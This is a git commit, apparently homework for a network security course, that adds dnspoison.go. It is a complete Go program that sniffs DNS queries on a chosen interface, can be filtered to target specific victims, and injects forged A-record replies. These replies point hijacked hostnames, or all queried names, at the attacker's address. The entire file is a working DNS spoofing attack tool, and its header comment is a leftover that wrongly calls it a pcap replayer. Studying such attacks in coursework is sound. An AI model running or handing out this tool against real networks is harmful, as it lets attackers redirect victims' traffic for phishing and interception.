3b91d38c6f3beb453041529aa5e0717f846c39f6
evenyoung <yiyun@igola.com>
2021-08-03 18:17:56 -0400

    [hw3]initial dnspoison.go

---
+++ hw3/dnspoison.go
@@ -0,0 +1,280 @@
+// Copyright 2012 Google, Inc. All rights reserved.
+//
+// Use of this source code is governed by a BSD-style license
+// that can be found in the LICENSE file in the root of the source
+// tree.
+
+// The pcaplay binary load an offline capture (pcap file) and replay
+// it on the select interface, with an emphasis on packet timing
+package main
+
+import (
+	"flag"
+	"fmt"
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
+	"github.com/google/gopacket/pcap"
+	"io/ioutil"
+	"net"
+	"os"
+	"strings"
+)
+
+// go run dnspoison.go [-i interface] [-f hostnames] [expression]
+func main() {
+	// Parsing command lines
+	var ifaceName string
+	var hostFile string
+	var bpfFilterArr []string
+	flag.StringVar(&ifaceName, "i", "", "Live capture from the network device <interface> (e.g., eth0). If not specified, mydump should automatically select a default interface to listen on.")
+	flag.StringVar(&hostFile, "f", "", "Read a list of IP address and hostname pairs specifying the hostnames to be hijacked. If '-f' is not specified, dnspoison would forge replies to all observed requests with the chosen interface's IP address as an answer")
+	flag.Usage = func() {
+		_, _ = fmt.Fprintf(flag.CommandLine.Output(), "Usage of %s:\n", os.Args[0])
+		flag.PrintDefaults()
+		fmt.Println("<expression> is a BPF filter that specifies a subset of the traffic to be monitored, which is useful for targeting a single victim or a group of victims")
+	}
+	flag.Parse()
+	bpfFilterArr = flag.Args()
+	if ifaceName == "" { // interface is not specified, set as default device interface
+		ifs, _ := pcap.FindAllDevs()
+		ifaceName = ifs[0].Name
+	}
+	// fmt.Println(interfaceName, hostFile, strings.Join(bpfFilterArr, " "))
+
+	// opens a device and returns a handle
+	handle, err := pcap.OpenLive(ifaceName, 1600, true, pcap.BlockForever)
+	if err != nil {
+		panic(err)
+	} else if flag.NArg() != 0 { // set BPFFilter if specified
+		if err := handle.SetBPFFilter(strings.Join(bpfFilterArr, " ")); err != nil {
+			panic(err)
+		}
+	}
+	defer handle.Close()
+
+	ip := getIfaceAddr(ifaceName)    // get ip addr relates to the specified interface
+	ipHosts := readMapping(hostFile) // read ip host mapping from file
+
+	// pre-allocate all the space needed for the layers
+	var ethLayer layers.Ethernet
+	var ipv4Layer layers.IPv4
+	var udpLayer layers.UDP
+	var dnsLayer layers.DNS
+
+	var q layers.DNSQuestion
+	var a layers.DNSResourceRecord
+
+	// create the decoder for fast-packet decoding
+	// (using the fast decoder takes about 10% the time of normal decoding)
+	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
+
+	// this slick will hold the names of the layers successfully decoded
+	decodedLayers := make([]gopacket.LayerType, 0, 4)
+
+	// pre-create the response with most of the data filled out
+	a.Type = layers.DNSTypeA
+	a.Class = layers.DNSClassIN
+	a.TTL = 600
+
+	// create a buffer for writing output packet
+	outbuf := gopacket.NewSerializeBuffer()
+
+	// set the arguments for serialization
+	serialOpts := gopacket.SerializeOptions{
+		FixLengths:       true,
+		ComputeChecksums: true,
+	}
+
+	// pre-allocate loop counter
+	var i uint16
+
+	// swap storage for ip and udp fields
+	var ipv4Addr net.IP
+	var udpPort layers.UDPPort
+	var ethMac net.HardwareAddr
+
+	// Main loop for dns packets intercepted
+	// No new allocations after this point to keep garbage collector
+	// cyles at a minimum
+	for {
+		packetData, _, err := handle.ZeroCopyReadPacketData()
+		if err != nil {
+			break
+		}
+
+		fmt.Println("Got packet from filter")
+
+		// decode this packet using the fast decoder
+		err = decoder.DecodeLayers(packetData, &decodedLayers)
+		if err != nil {
+			fmt.Println("Decoding error!")
+			continue
+		}
+
+		// only proceed if all layers decoded
+		if len(decodedLayers) != 4 {
+			fmt.Println("Not enough layers!")
+			continue
+		}
+
+		// check that this is not a response
+		if dnsLayer.QR {
+			continue
+		}
+
+		// print the question section
+		for i = 0; i < dnsLayer.QDCount; i++ {
+			fmt.Println(string(dnsLayer.Questions[i].Name))
+		}
+
+		// set this to be a response
+		dnsLayer.QR = true
+
+		// if recursion was requested, it is available
+		if dnsLayer.RD {
+			dnsLayer.RA = true
+		}
+
+		// for each question
+		for i = 0; i < dnsLayer.QDCount; i++ {
+
+			// get the question
+			q = dnsLayer.Questions[i]
+
+			// verify this is an A-IN record question
+			if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
+				continue
+			}
+
+			// copy the name across to the response
+			a.Name = q.Name
+			// assign related ip addr
+			if ipStr, ok := ipHosts[string(q.Name)]; ok {
+				a.IP = net.ParseIP(ipStr)
+			} else {
+				a.IP = ip
+			}
+
+			// append the answer to the original query packet
+			dnsLayer.Answers = append(dnsLayer.Answers, a)
+			dnsLayer.ANCount = dnsLayer.ANCount + 1
+
+		}
+
+		// swap ethernet macs
+		ethMac = ethLayer.SrcMAC
+		ethLayer.SrcMAC = ethLayer.DstMAC
+		ethLayer.DstMAC = ethMac
+
+		// swap the ip
+		ipv4Addr = ipv4Layer.SrcIP
+		ipv4Layer.SrcIP = ipv4Layer.DstIP
+		ipv4Layer.DstIP = ipv4Addr
+
+		// swap the udp ports
+		udpPort = udpLayer.SrcPort
+		udpLayer.SrcPort = udpLayer.DstPort
+		udpLayer.DstPort = udpPort
+
+		// set the UDP to be checksummed by the IP layer
+		err = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
+		if err != nil {
+			panic(err)
+		}
+
+		// serialize packets
+		err = gopacket.SerializeLayers(outbuf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
+		if err != nil {
+			panic(err)
+		}
+
+		// write packet
+		err = handle.WritePacketData(outbuf.Bytes())
+		if err != nil {
+			panic(err)
+		}
+
+		fmt.Println("Response sent")
+
+		// comment out for debugging
+		continue
+
+		// DEBUGGG--------------------------------------------------------------
+
+		err = decoder.DecodeLayers(outbuf.Bytes(), &decodedLayers)
+		if err != nil {
+			fmt.Println("Decoding error: " + err.Error())
+			continue
+		}
+
+		// only proceed if all layers decoded
+		if len(decodedLayers) != 4 {
+			fmt.Println("Not enough layers!")
+			for j := range decodedLayers {
+				fmt.Println(decodedLayers[j])
+			}
+			continue
+		}
+
+		// print packet
+		fmt.Printf("IP src %v\n", ipv4Layer.SrcIP)
+		fmt.Printf("IP dst %v\n", ipv4Layer.DstIP)
+		fmt.Printf("UDP src port: %v\n", udpLayer.SrcPort)
+		fmt.Printf("UDP dst port: %v\n", udpLayer.DstPort)
+		fmt.Printf("DNS Quy count: %v\n", dnsLayer.QDCount)
+		// print the question section
+		for i = 0; i < dnsLayer.QDCount; i++ {
+			fmt.Printf("%v\n", string(dnsLayer.Questions[i].Name))
+		}
+		fmt.Printf("DNS Ans count: %v\n", dnsLayer.ANCount)
+
+		// print the question section
+		for i = 0; i < dnsLayer.ANCount; i++ {
+			fmt.Printf("%v type %v\n", string(dnsLayer.Answers[i].Name), dnsLayer.Answers[i].Type)
+			fmt.Printf("\t%v\n", dnsLayer.Answers[i].IP)
+		}
+
+		break
+
+	}
+
+}
+
+func getIfaceAddr(ifaceName string) net.IP {
+	ifaces, _ := net.Interfaces()
+	for i := range ifaces {
+		if ifaces[i].Name == ifaceName {
+			addrs, err := ifaces[i].Addrs()
+			if err != nil {
+				panic(err)
+			}
+
+			if len(addrs) == 0 {
+				panic("No addr relates to specified interface")
+			}
+
+			ip, _, _ := net.ParseCIDR(addrs[0].String())
+			return ip
+		}
+	}
+	return nil
+}
+
+func readMapping(filename string) map[string]string {
+	if filename == "" {
+		return map[string]string{} // return an empty map if filename not specified
+	}
+
+	ipHost := make(map[string]string)
+	data, _ := ioutil.ReadFile(filename)
+	lines := strings.Split(string(data), "\n")
+	for _, element := range lines {
+		line := strings.Fields(element)
+		if len(line) == 0 {
+			break
+		}
+		ipHost[line[1]] = line[0]
+	}
+	fmt.Println(ipHost)
+	return ipHost
+}
